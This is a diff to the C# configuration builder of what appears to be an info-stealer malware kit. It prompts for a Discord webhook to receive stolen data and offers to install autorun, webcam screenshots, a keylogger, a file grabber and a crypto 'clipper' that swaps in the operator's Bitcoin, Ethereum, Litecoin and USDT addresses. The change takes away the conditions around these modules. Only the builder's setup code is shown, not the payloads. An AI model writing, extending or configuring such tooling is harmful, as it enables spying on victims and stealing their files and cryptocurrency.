@@ -26,7 +26,7 @@ internal class Program
         var settings = Settings.LoadSettings();
         
         // Settings
-        var token = Cli.GetStringValue("Discord webhook url", settings.Webhook);
+        var token = Cli.GetWebhookValue("Discord webhook url", settings.Webhook);
         // Test connection to Discord webhook url
         if (!Discord.WebhookIsValid(token))
             Cli.ShowError("Check the fucking webhook url!");
@@ -43,23 +43,18 @@ internal class Program
         Build.ConfigValues["Startup"] = Cli.GetBoolValue("Install autorun?", settings.Startup);
         Build.ConfigValues["StartDelay"] = Cli.GetBoolValue("Use random start delay?", settings.StartDelay);
         // Modules
-        if (Build.ConfigValues["Startup"].Equals("1"))
-        {
-            Build.ConfigValues["WebcamScreenshot"] = Cli.GetBoolValue("Create webcam screenshots?", settings.WebcamScreenshot);
-            Build.ConfigValues["Keylogger"] = Cli.GetBoolValue("Install keylogger?", settings.Keylogger);
-            Build.ConfigValues["Clipper"] = Cli.GetBoolValue("Install clipper?", settings.Clipper);
-        }
-
+        Build.ConfigValues["WebcamScreenshot"] = Cli.GetBoolValue("Create webcam screenshots?", settings.WebcamScreenshot);
+        Build.ConfigValues["Keylogger"] = Cli.GetBoolValue("Install keylogger?", settings.Keylogger);
+        Build.ConfigValues["Clipper"] = Cli.GetBoolValue("Install clipper?", settings.Clipper);
         Build.ConfigValues["Grabber"] = Cli.GetBoolValue("File Grabber ?", settings.Grabber);
 
         // Clipper addresses
-        if (Build.ConfigValues["Clipper"].Equals("1"))
-        {
-            Build.ConfigValues["ClipperBTC"] = Cli.GetValidatedWallet("Clipper : Your bitcoin address", "bitcoin", settings.ClipperBTC);
-            Build.ConfigValues["ClipperETH"] = Cli.GetValidatedWallet("Clipper : Your etherium address", "ethereum", settings.ClipperETH);
-            Build.ConfigValues["ClipperLTC"] = Cli.GetValidatedWallet("Clipper : Your litecoin address", "litecoin", settings.ClipperLTC);
-            Build.ConfigValues["ClipperUSDT"] = Cli.GetValidatedWallet("Clipper : Your USDT address", "usdt", settings.ClipperUSDT);
-        }
+        
+        Build.ConfigValues["ClipperBTC"] = Cli.GetValidatedWallet("Clipper : Your bitcoin address", "bitcoin", settings.ClipperBTC);
+        Build.ConfigValues["ClipperETH"] = Cli.GetValidatedWallet("Clipper : Your etherium address", "ethereum", settings.ClipperETH);
+        Build.ConfigValues["ClipperLTC"] = Cli.GetValidatedWallet("Clipper : Your litecoin address", "litecoin", settings.ClipperLTC);
+        Build.ConfigValues["ClipperUSDT"] = Cli.GetValidatedWallet("Clipper : Your USDT address", "usdt", settings.ClipperUSDT);
+    
 
         // Save current settings for next time
         var currentSettings = new SettingsData
